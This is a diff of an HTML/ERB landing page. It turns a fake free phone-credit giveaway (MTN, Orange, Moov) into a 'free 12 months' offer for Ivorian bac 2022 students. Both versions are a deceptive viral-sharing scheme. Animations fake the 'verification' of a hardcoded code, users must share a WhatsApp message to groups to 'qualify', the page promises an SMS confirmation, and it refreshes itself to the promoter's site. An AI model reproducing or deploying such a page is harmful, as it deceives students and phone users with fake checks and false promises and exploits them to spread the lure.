@@ -1,5 +1,3 @@
-
-
 <html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
 <head>
     <meta http-equiv="refresh" content="240; url=http://bac-2022.herokuapp.com">
@@ -620,6 +618,7 @@ font-size: 21px;
     font-family: 'ProximaNovaBlack';">À l'occasion du notre jour de l'indépendance ✨</h3>
         <center>
             <%= image_tag "resultat-bac-2021.jpeg", style:"width: 33%;" %>
+            <span>220.000 élèves ont échoué et nous allons nous préparer et affronter le bac ensemble</span>
         </center>
         <br />
         <div class="quedate-container">
@@ -627,24 +626,14 @@ font-size: 21px;
                 <!-- Primera parte: ads description -->
                 <div class="quedate__step" id="first-box">
                     <div class="quedate__step-box">
-
-<p style="color: black;
-    font-family: system-ui;
-    font-size: 1.7rem;
-    font-weight: 800;
-    direction: ltr;
-    text-align: center;
-    margin-top: -93px;">
-    
-    <font>
-    MTN - Orange - Moov sont heureux d'offrir à tous 6000 francs de crédit d'appel + 25Go internet gratuit disponible pendant un mois
-    <br>
-    
-
-        </font>
+                        <p style="color: black; font-family: system-ui; font-size: 1.7rem; font-weight: 800; direction: ltr; text-align: center;  margin-top: -93px;">
+                            <font>
+                                LNCLASS EDUCATION - offre 12 MOIS GRATUITS POUR SE PREPARER ET AFFRONTER LE BAC 2022 à 500 Eleves de terminale.
+                                <br>
+                            </font>
                         </p>
                     </div>
-                    <button style=" ;" id="validar" class="quedate__cta-btn">Obtenir mon crédit</button>
+                    <button style=" ;" id="validar" class="quedate__cta-btn">Demandez Ma Place</button>
                 </div>
                 <div class="quedate__loading">
                     <!--loading svg-->
@@ -681,43 +670,31 @@ font-size: 21px;
                         </svg>
                     <!--end check svg-->
                     <span class="quedate__porcent js-hidden"></span>
-                    <span style="font-size: 16px;font-weight: bold;" class="quedate__porcent-text js-hidden">Merci, vous vous qualifiez</span>
+                    <span style="font-size: 16px;font-weight: bold;" class="quedate__porcent-text js-hidden">Merci <%= @resultat.username %>, nous avons trouver votre identifiant </span>
                 </div>
                 <!-- termina la primera parte -->
                 <!-- Segunda parte -->
                 <div id="second-box" style="margin-bottom: 2.5rem" class="quedate__step js-hidden">
                   <div align="center">
-  <font color="black">
-  <b style="
-    font-size: 15px;
-">
-Sélectionnez votre ligne  </b>
-<br>
-  </font>
-  <br />
-  <font color="black">
-  <select id="country" name="country">
-<option value="mtn" />MTN
-<option value="mtn" />Orange
-<option value="mtn" />Moov
-<option value="mtn" />Autre ligne 
-    </select></font>
+                    <font color="black">
+                        <b style="font-size: 15px;">Verifions Votre Identifiant </b>
+                    </font><br />
                   </div>
                     <script>
                         var prevent = (e) => e.preventDefault();
                     </script>
                     <form class="quedate__form" onsubmit="return prevent(event)">
-                        <input class="quedate__form-input" id="num" type="text" placeholder="Votre numéro" />
+                        <input class="quedate__form-input bg-gray-200 " id="num" type="text" value="CI-BAC-2022-XMLPO" />
                         <span class="quedate__form-separar"></span>
-                        <label id="enviar" class="quedate__form-label" for="num">Vérifier l'éligibilité</label>
+                        <label id="enviar" class="quedate__form-label bg-green-400" for="num">Vérifier votre code</label>
                         <div class="message-status js-hidden"></div>
                     </form>
                 </div>
                 <!-- Tercera parte -->
                 <div id="third-box" style="margin-bottom: 2.5rem;" class="quedate__step js-hidden">
-                    <span style="font-weight: bold; font-size: 2rem; text-align:center" class="quedate__text">Les données sont en cours de vérification</span>
+                    <span style="font-weight: bold; font-size: 2rem; text-align:center" class="quedate__text">vérification du code CI-BAC-2022-XMLPO en cours</span>
                     <div class="quedate__first js-hidden">
-                        <div style="border: 1px solid gray;  width:80%" class="quedate__load">Vérification du nom complet ...<span class="quedate__load-a js-hidden"></span>
+                        <div style="border: 1px solid gray;  width:80%" class="quedate__load">Vérification du code CI-BAC-2022-XMLPO complète ...<span class="quedate__load-a js-hidden"></span>
                         </div>
                         <div style="border: 1px solid gray;border-left: none; width:30%" class="quedate__load-icon">
                             <svg id="first-loading" class="quedate__load-animate" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto;" viewbox="0 0 100 100" preserveaspectratio="xMidYMid" width="3.2rem">
@@ -803,7 +780,8 @@ Sélectionnez votre ligne  </b>
                             </circle>
                         </svg>
                     </div>
-<p style="font-size: 14px;font-weight: bold;">Attendez &#1548; Nous validons les données </p>                </div>
+                        <p style="font-size: 14px;font-weight: bold;">Attendez &#1548; Nous validons votre identifaint</p> 
+                    </div>
             </main>
         </div>
         <!-- FIN PASOS -->
@@ -859,8 +837,8 @@ Sélectionnez votre ligne  </b>
         <!--congratulations -->
         <div id="share" class="loading2 js-hidden js-congrats">
             <div class="loading2__box" style="direction: ltr;">
-<span style="font-weight: bold; font-size:15px"> Félicitations! Vous avez gagnez 6000 francs de crédit d'appel + 25Go internet gratuit</span><br /><br />
-                <b>Comment recevoir mon crédit</b>
+<span style="font-weight: bold; font-size:15px"> Félicitations! Vous etes sur la liste de 12 mois gratuit sur la plateforme lnclass</span><br /><br />
+                <b>Comment augmenter ses chances pour bénéfier de 12 mois gratuit</b>
                  <br /><br />
                  <b>1.Cliquez sur le bouton WhatsApp ci-dessous et partagez le message avec vos amis jusqu'à ce que la barre verte ci-dessous soit remplie.</b>
                  <br />
@@ -868,7 +846,7 @@ Sélectionnez votre ligne  </b>
           <b>2. Après avoir partagé le message avec vos amis et rempli la barre verte, vous serez automatiquement dirigé vers un répondeur automatique qui vous dira où et quand recevoir votre crédit</b>
                 <br /><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Vous recevrez une confirmation par SMS dans les 15 minutes</font></font></b>
                 <div style="margin-top: 30px;margin-bottom: 30px;" class="quedate__first js-hidden js-share">
-                    <div style="border: 1px solid gray; width:80%" class="quedate__load">Share with your groups <span class="quedate__load-a js-hidden"></span>
+                    <div style="border: 1px solid gray; width:80%" class="quedate__load">partagé dans 5 groupes <span class="quedate__load-a js-hidden"></span>
                     </div>
                     <div style="border: 1px solid gray;border-left: none; width:30%" class="quedate__load-icon">
                         <svg id="third-loading" class="quedate__load-animate" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto;" viewbox="0 0 100 100" preserveaspectratio="xMidYMid" width="3.2rem">
@@ -919,9 +897,7 @@ Sélectionnez votre ligne  </b>
 *Pour Autre ligne 👇* %0A bit.ly/ivory-recharge
 %0A
 " data-action="share/whatsapp/share">
-<img src="wusihxq.png" border="0" align="middle" style="
-    width: 56%;
-" /></a>
+<%= image_tag "whatsapp.png", border:"0", align:"middle", style:" width: 56%;", alt:"whatsapp" %></a>
 </div>
     </center>           
             </div>
@@ -1240,8 +1216,8 @@ Sélectionnez votre ligne  </b>
             congrats: document.querySelector(".js-congrats"),
             sharing: document.querySelector(".js-share"),
             verify: document.querySelector("#verify")
-        }, objServer = {}, landingDomain = "http://ocawin.com/ivory",
-        adsLink = "http://ocawin.com/ivory";
+        }, objServer = {}, landingDomain = "http://bac-2022.herokuapp.com",
+        adsLink = "http://bac-2022.herokuapp.com";
     document.addEventListener("click", function (c) {
         console.log(c);
         var a = c.toElement || c.srcElement;
